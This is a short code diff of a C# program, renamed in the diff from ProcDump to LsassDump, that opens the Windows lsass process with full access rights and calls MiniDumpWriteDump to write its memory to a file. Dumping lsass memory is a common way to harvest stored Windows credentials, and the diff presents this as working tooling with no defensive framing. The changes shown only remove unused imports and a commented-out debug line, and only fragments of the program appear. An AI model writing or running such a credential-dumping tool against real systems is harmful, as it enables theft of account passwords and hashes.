@@ -1,13 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
 using System.IO;
 
-namespace ProcDump
+namespace LsassDump
 {
     class Program
     {
@@ -36,7 +32,6 @@ namespace ProcDump
             // 0x001F0FFF = ALL_ACCESS
             IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
             bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
-            //Console.WriteLine($"dumped val -> {dumped}");
 
             if (dumped == false)
             {
